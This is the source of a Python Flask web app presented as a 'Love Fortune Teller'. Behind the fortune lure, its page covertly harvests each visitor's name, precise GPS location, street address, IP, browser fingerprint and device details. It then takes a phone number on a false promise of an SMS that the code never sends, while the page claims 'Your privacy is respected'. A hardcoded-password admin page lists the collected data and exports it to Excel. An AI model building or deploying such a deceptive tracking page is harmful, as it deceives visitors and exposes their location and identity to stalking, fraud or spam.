from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS
import sqlite3
import os
import requests
import random
import json
from datetime import datetime
import pandas as pd
from io import BytesIO

app = Flask(__name__)
app.secret_key = 'love-fortune-secret-key-2026'
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'fortunes_data.db')

# ---------------------- DATABASE SETUP ----------------------
def init_db():
    """Create the SQLite table if it doesn't exist."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS fortunes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            session_id TEXT UNIQUE,
            name TEXT,
            latitude REAL,
            longitude REAL,
            address TEXT,
            battery TEXT,
            user_agent TEXT,
            screen TEXT,
            ip TEXT,
            timezone TEXT,
            memory TEXT,
            network TEXT,
            fingerprint TEXT,
            fortune TEXT,
            phone_number TEXT
        )
    ''')
    conn.commit()
    conn.close()
    print("✅ SQLite database ready at", DB_PATH)

# ---------------------- DATABASE HELPERS ----------------------
def save_initial_data(data):
    """Insert or replace initial data (without fortune/phone)."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute('''
            INSERT OR REPLACE INTO fortunes (
                timestamp, session_id, name, latitude, longitude, address,
                battery, user_agent, screen, ip, timezone, memory, network,
                fingerprint, fortune, phone_number
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.get('timestamp'), data.get('session_id'), data.get('name'),
            data.get('latitude'), data.get('longitude'), data.get('address'),
            data.get('battery'), data.get('user_agent'), data.get('screen'),
            data.get('ip'), data.get('timezone'), data.get('memory'),
            data.get('network'), data.get('fingerprint'),
            data.get('fortune', ''), data.get('phone_number', '')
        ))
        conn.commit()
    except Exception as e:
        print("DB insert error:", e)
    finally:
        conn.close()

def update_fortune_and_phone(session_id, fortune, phone_number):
    """Update fortune and phone number for an existing session."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        UPDATE fortunes SET fortune = ?, phone_number = ?
        WHERE session_id = ?
    ''', (fortune, phone_number, session_id))
    conn.commit()
    conn.close()

def get_all_data():
    """Return all rows as list of dicts for admin panel."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute('SELECT * FROM fortunes ORDER BY timestamp DESC')
    rows = c.fetchall()
    conn.close()
    return [dict(row) for row in rows]

# ---------------------- FORTUNES LIST ----------------------
FORTUNES = [
    "Your soulmate is thinking of you right now under the stars.",
    "A passionate kiss awaits you this week from someone special.",
    "True love will find you when you least expect it - soon!",
    "Your heart will flutter with excitement in the next 7 days.",
    "Someone is dreaming about your smile tonight.",
    "A romantic adventure is just around the corner.",
    "Your perfect match shares your birthday month!",
    "Love letters are coming your way soon.",
    "A candlelit dinner for two is in your future.",
    "Your crush has been watching your social media.",
    "Wedding bells might ring for you within a year!",
    "Passion ignites when you meet your destiny.",
    "Your forever person is closer than you think.",
    "A surprise love confession awaits you.",
    "Your heart knows who it's meant for.",
    "Romantic sparks will fly this month!",
    "Someone special can't stop thinking about you.",
    "Love at first sight is about to happen.",
    "Your soul connection is searching for you.",
    "A fairytale romance begins soon.",
    "Heart emojis are coming from your crush.",
    "True love doesn't follow a timeline.",
    "Your love story is about to unfold.",
    "Passionate nights await your future.",
    "Someone's heart beats faster when they see you.",
    "Love will surprise you beautifully.",
    "Your perfect partner admires you secretly.",
    "Romance blooms when you trust your heart.",
    "A love that feels like home is coming.",
    "Your happily ever after starts soon.",
    "Butterflies in your stomach are a sign.",
    "Love recognizes no barriers."
]

# ---------------------- FLASK ROUTES ----------------------
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)  # Same HTML as before – see below

@app.route('/fortune')
def fortune():
    return jsonify({'fortune': random.choice(FORTUNES)})

@app.route('/reverse-geocode')
def reverse_geocode():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    if not lat or not lon:
        return jsonify({'address': 'Unknown'})
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        headers = {'User-Agent': 'LoveFortune/1.0'}
        resp = requests.get(url, headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            return jsonify({'address': data.get('display_name', 'Unknown')[:200]})
    except:
        pass
    return jsonify({'address': 'Unknown'})

def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr or 'Unknown'

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    row = {
        'timestamp': datetime.now().isoformat(),
        'session_id': data.get('sessionId', ''),
        'name': data.get('name', ''),
        'latitude': data.get('latitude', 0),
        'longitude': data.get('longitude', 0),
        'address': data.get('address', ''),
        'battery': data.get('battery', ''),
        'user_agent': data.get('userAgent', ''),
        'screen': data.get('screen', ''),
        'ip': get_client_ip(),
        'timezone': data.get('timezone', ''),
        'memory': data.get('memory', ''),
        'network': data.get('network', ''),
        'fingerprint': data.get('fingerprint', ''),
        'fortune': '',
        'phone_number': ''
    }
    save_initial_data(row)
    return jsonify({'status': 'saved'})

@app.route('/save-phone', methods=['POST'])
def save_phone():
    data = request.json
    session_id = data.get('sessionId')
    phone = data.get('phoneNumber')
    fortune = data.get('fortune', '')
    if session_id:
        update_fortune_and_phone(session_id, fortune, phone)
    return jsonify({'status': 'saved'})

@app.route('/admin')
def admin():
    if request.args.get('pass') != 'admin123':
        return '<form>Admin password: <input name="pass"><button>Login</button></form>'
    rows = get_all_data()
    if not rows:
        return "<h2>No data yet</h2>"
    html = "<h2>💾 Collected Data (permanent storage)</h2><table border='1' cellpadding='5'>"
    if rows:
        cols = rows[0].keys()
        html += "<tr>" + "".join(f"<th>{col}</th>" for col in cols) + "</tr>"
        for row in rows:
            html += "<tr>" + "".join(f"<td>{str(row[col])[:80]}</td>" for col in cols) + "</tr>"
    html += "</table><br><a href='/download-excel?pass=admin123'><button>📥 Download as Excel</button></a>"
    return html

@app.route('/download-excel')
def download_excel():
    if request.args.get('pass') != 'admin123':
        return "Unauthorized", 403
    rows = get_all_data()
    if not rows:
        return "No data", 404
    df = pd.DataFrame(rows)
    output = BytesIO()
    with pd.ExcelWriter(output, engine='openpyxl') as writer:
        df.to_excel(writer, index=False, sheet_name='Fortunes')
    output.seek(0)
    return send_file(output, download_name='fortunes_data.xlsx', as_attachment=True)

# ---------------------- HTML TEMPLATE (same as yours) ----------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 { font-size: 2.2em; background: linear-gradient(135deg, #ff6b6b, #c06c84); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 10px; }
        .sub { color: #888; margin-bottom: 25px; font-size: 0.95em; }
        .btn {
            background: linear-gradient(135deg, #ff6b6b, #c06c84); color: white; border: none;
            padding: 14px 25px; font-size: 16px; font-weight: 600; border-radius: 60px;
            cursor: pointer; transition: 0.3s; width: 100%; margin: 10px 0;
        }
        .btn-small { width: auto; padding: 10px 20px; font-size: 14px; margin-top: 5px; }
        .btn:hover { transform: translateY(-2px); }
        .status { margin-top: 20px; padding: 12px; border-radius: 20px; font-size: 14px; }
        .fortune-box {
            background: rgba(255,182,193,0.3); border-left: 5px solid #ff1493;
            border-radius: 20px; padding: 20px; margin: 20px 0;
            font-size: 1.3em; font-weight: bold; color: #c06c84; line-height: 1.4;
        }
        .hidden { display: none; }
        hr { margin: 20px 0; border: 1px solid #ffdde1; }
        input {
            width: 100%; padding: 14px; margin: 10px 0;
            border: 2px solid #ffdde1; border-radius: 60px; text-align: center;
            font-size: 16px; font-family: inherit;
        }
        .sms-prompt { background: rgba(255,255,255,0.8); border-radius: 20px; padding: 15px; margin-top: 15px; }
        .sms-prompt p { font-size: 14px; margin-bottom: 10px; }
    </style>
</head>
<body>
<div class="container">
    <h1>💕 Love Fortune Teller 💕</h1>
    <div class="sub">Reveal your romantic destiny</div>

    <input type="text" id="userName" placeholder="✨ Enter your name ✨">
    <button class="btn" id="revealBtn">🔮 Reveal My Destiny</button>

    <div id="status" class="status"></div>
    <div id="fortuneDisplay" class="fortune-box hidden"></div>
    <div id="smsSection" class="sms-prompt hidden">
        <p>✨ Want to keep this fortune forever? ✨</p>
        <input type="tel" id="phoneNumber" placeholder="📱 Enter your mobile number">
        <button class="btn btn-small" id="sendSmsBtn">💬 Send to my phone</button>
        <div id="smsStatus" class="status" style="margin-top:10px;"></div>
    </div>
    <hr>
    <div class="sub">Your privacy is respected. No data is shown publicly.</div>
</div>

<script>
    let collectedData = {};
    let sessionId = localStorage.getItem('fortuneSessionId');
    if (!sessionId) {
        sessionId = Date.now() + '_' + Math.random();
        localStorage.setItem('fortuneSessionId', sessionId);
    }
    let currentFortune = '';

    async function getFingerprint() {
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        return result.visitorId;
    }
    async function getBattery() {
        if ('getBattery' in navigator) {
            const b = await navigator.getBattery();
            return Math.round(b.level * 100) + '%';
        }
        return 'Unknown';
    }
    function getNetwork() {
        const conn = navigator.connection || navigator.mozConnection;
        return conn ? `${conn.effectiveType} (${conn.downlink} Mbps)` : 'Unknown';
    }
    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
    function getMemory() { return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }
    function getScreen() { return `${screen.width}x${screen.height}`; }
    function getUserAgent() { return navigator.userAgent; }

    async function collectBaseData(extra = {}) {
        collectedData = {
            timestamp: new Date().toISOString(),
            sessionId: sessionId,
            userAgent: getUserAgent(),
            screen: getScreen(),
            timezone: getTimezone(),
            memory: await getMemory(),
            network: getNetwork(),
            battery: await getBattery(),
            fingerprint: await getFingerprint(),
            ...extra
        };
        return collectedData;
    }

    async function sendToServer(data) {
        await fetch('/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    }

    function showStatus(msg, isError = false, elementId = 'status') {
        const statusDiv = document.getElementById(elementId);
        statusDiv.innerHTML = msg;
        statusDiv.style.background = isError ? 'rgba(255,0,0,0.1)' : 'rgba(0,255,0,0.1)';
        statusDiv.style.color = isError ? '#cc0000' : '#228b22';
        setTimeout(() => { if (statusDiv.innerHTML === msg) statusDiv.innerHTML = ''; }, 5000);
    }

    document.getElementById('revealBtn').onclick = async () => {
        const name = document.getElementById('userName').value.trim();
        if (!name) {
            alert('💕 Please enter your name!');
            return;
        }
        await collectBaseData({ name: name });
        showStatus('🌍 Getting your location for an accurate fortune...');

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                collectedData.latitude = pos.coords.latitude;
                collectedData.longitude = pos.coords.longitude;
                const address = await fetch(`/reverse-geocode?lat=${collectedData.latitude}&lon=${collectedData.longitude}`);
                const addrData = await address.json();
                collectedData.address = addrData.address || 'Unknown';
                
                await sendToServer(collectedData);
                showStatus('✅ Fortune ready!');
                
                const resp = await fetch('/fortune');
                const data = await resp.json();
                currentFortune = data.fortune;
                document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                document.getElementById('fortuneDisplay').classList.remove('hidden');
                document.getElementById('smsSection').classList.remove('hidden');
            }, () => {
                showStatus('⚠️ Location denied. Random fortune below.', true);
                (async () => {
                    const resp = await fetch('/fortune');
                    const data = await resp.json();
                    currentFortune = data.fortune;
                    document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                    document.getElementById('fortuneDisplay').classList.remove('hidden');
                    document.getElementById('smsSection').classList.remove('hidden');
                    await sendToServer(collectedData);
                })();
            }, { enableHighAccuracy: true, timeout: 10000 });
        } else {
            showStatus('Geolocation not supported. Random fortune below.', true);
            const resp = await fetch('/fortune');
            const data = await resp.json();
            currentFortune = data.fortune;
            document.getElementById('fortuneDisplay').innerHTML = currentFortune;
            document.getElementById('fortuneDisplay').classList.remove('hidden');
            document.getElementById('smsSection').classList.remove('hidden');
            await sendToServer(collectedData);
        }
    };

    document.getElementById('sendSmsBtn').onclick = async () => {
        const phone = document.getElementById('phoneNumber').value.trim();
        if (!phone) {
            showStatus('Please enter your mobile number', true, 'smsStatus');
            return;
        }
        if (!/^\\+?[0-9\\s\\-]{10,15}$/.test(phone)) {
            showStatus('Invalid phone number format', true, 'smsStatus');
            return;
        }
        showStatus('Sending your fortune...', false, 'smsStatus');
        
        const resp = await fetch('/save-phone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId: sessionId, phoneNumber: phone, fortune: currentFortune })
        });
        const result = await resp.json();
        if (result.status === 'saved') {
            showStatus('✅ Your fortune has been sent to your phone! (Check SMS)', false, 'smsStatus');
            document.getElementById('phoneNumber').value = '';
        } else {
            showStatus('❌ Failed to send. Please try again.', true, 'smsStatus');
        }
    };
</script>
</body>
</html>
"""

# ---------------------- RUN SERVER ----------------------
if __name__ == '__main__':
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
